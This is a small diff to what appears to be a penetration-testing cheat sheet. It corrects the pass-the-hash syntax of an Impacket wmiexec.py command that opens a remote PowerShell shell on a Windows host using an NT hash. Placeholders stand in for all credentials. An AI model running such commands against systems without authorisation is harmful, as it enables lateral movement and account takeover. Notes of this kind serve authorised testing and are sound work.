@@ -15,7 +15,7 @@ wmiexec.py -debug -shell-type powershell <domain_fqdn>/<user>:'<password>'@<targ
 
 ## execute (pth) 
 ```bash
-wmiexec.py -debug -shell-type powershell -hashes <nt_hash> <user>@<target_fqdn>
+wmiexec.py -debug -shell-type powershell -hashes :<nt_hash> <user>@<target_fqdn>
 ```
 
 ## execute (ptt)
